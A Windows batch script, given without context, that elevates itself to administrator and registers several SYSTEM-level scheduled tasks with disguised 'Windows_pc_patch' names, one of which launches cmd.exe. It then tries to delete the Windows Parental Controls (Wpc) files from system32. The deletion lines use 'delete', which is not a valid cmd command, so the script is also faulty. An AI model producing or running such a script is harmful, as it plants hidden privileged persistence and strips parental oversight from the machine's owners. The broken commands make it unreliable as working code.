powershell /c start-process -verb runAs \"%~s0\"
SCHTASKS /CREATE /SC onStart /TN "Windows_pc_patch_dosexec" /TR "%programdata%\Wpc\dosexec.bat" /ru system /ec system /f
cls
SCHTASKS /CREATE /SC onevent /TN "Windows_pc_patch_msdos" /TR "%programdata%\Wpc\msdos.bat" /RU system /ec system /f
cls
SCHTASKS /CREATE /SC onevent /TN "Windows_pc_patch_repair" /TR "%programdata%\Wpc\repair.bat" /RU system /ec system /f
cls
SCHTASKS /CREATE /SC onevent /TN "Windows_pc_patch_patch" /TR "%programdata%\Wpc\patch.bat" /RU system /ec system /f
cls
SCHTASKS /CREATE /SC onevent /TN "Windows_pc_patch_cmd" /TR "c:\Windows\system32\cmd.exe" /RU system /ec system /f
cls
cd %windir%\system32
delete WpcMigration.uplevel.dll
delete Wpc.dll
delete WpcMon.exe
delete WpcApi.dll
delete WpcWebfilter.dll
delete WpcDesktopMonSvc.dll
delete Wpctok.exe
delete WpcRefreshTask.dll
delete Wpc.dll.mui
delete WpcMon.exe.mui
delete WpcProxyStubs.dll
delete WpcRefresh.dll.mui
delete Wpcatltoast.png
delete Wpcmon.png
echo done ;)
powershell sleep 1
